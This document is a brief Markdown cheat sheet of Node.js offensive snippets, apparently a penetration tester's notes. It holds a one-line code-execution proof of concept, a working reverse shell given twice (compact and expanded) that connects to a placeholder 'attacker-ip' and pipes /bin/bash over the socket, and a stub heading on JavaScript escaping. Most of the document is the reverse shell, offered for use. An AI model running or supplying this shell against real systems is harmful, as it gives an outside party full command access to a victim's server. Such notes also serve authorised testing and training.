# Node JS Tips

## Whitebox RCE POC
```javascript
require('util').log('SUCCESSFUL_CODE_EXECUTION');
```

## Reverse shell
* Few lines
    ```javascript
    var net = require("net"), sh = require("child_process").exec("/bin/bash");
    var client = new net.Socket();
    client.connect(80, "attacker-ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
    sh.stderr.pipe(client);});
    ```
* Expanded:
    ```javascript
    var net = require("net"),
    sh = require("child_process").exec("/bin/bash");
    var client = new net.Socket();
    client.connect(80, "attacker-ip", function()
      {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
      }
    );
    ```
## Javascript Escaping[^1]


[^1]: [JS Escapes @mathias](https://mothereff.in/js-escapes)
